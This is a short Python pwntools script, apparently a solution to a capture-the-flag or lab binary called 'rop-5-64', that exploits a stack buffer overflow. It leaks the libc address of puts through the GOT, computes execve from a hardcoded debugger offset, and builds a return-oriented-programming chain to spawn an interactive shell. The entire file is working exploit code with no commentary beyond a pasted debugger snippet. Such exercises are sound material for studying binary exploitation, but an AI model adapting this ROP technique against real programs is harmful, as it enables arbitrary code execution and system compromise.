#!/usr/bin/env python

from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
p = process('./rop-5-64')
#p = process('./rop-5-6x')

puts_got = p.elf.got['puts']
puts_plt = p.elf.plt['puts']
input_func = p.elf.symbols['input_func']
print("GOT of puts %s" % hex(puts_got))
print("puts@plt %s" % hex(puts_plt))
print("input_func() %s" % hex(input_func))

pop_rdi = p64(0x400763)
pop_rsi_x = p64(0x400761)
pop_rdx_x = p64(0x400688)
path = p64(0x400012)

discard = p64(0)

buf = "A"*0x80 + "BBBBBBBB" + pop_rdi + p64(puts_got) + p64(puts_plt) + p64(input_func)

p.recv()
p.sendline(buf)

data = p.recv()
print(repr(data))

rawdata = data[len(buf)+9-30:]
print(repr(rawdata))

libc_puts = u64(rawdata[:6]+'\x00\x00')
print("Addr of puts: %s" % hex(libc_puts))

#a = hex(libc_puts)[:-3]

"""
$1 = {<text variable, no debug info>} 0x7fc996685690 <_IO_puts>
pwndbg> print execve
$2 = {<text variable, no debug info>} 0x7fc9966e2770 <execve>
"""

offset = 0x7fc9966e2770 - 0x7fc996685690

libc_execve = p64(libc_puts + offset)

buf =  "A"*0x80 + "BBBBBBBB"
buf += pop_rdi + path + pop_rsi_x + p64(0) + discard + pop_rdx_x + p64(0) + discard + libc_execve

p.sendline(buf)
p.interactive()
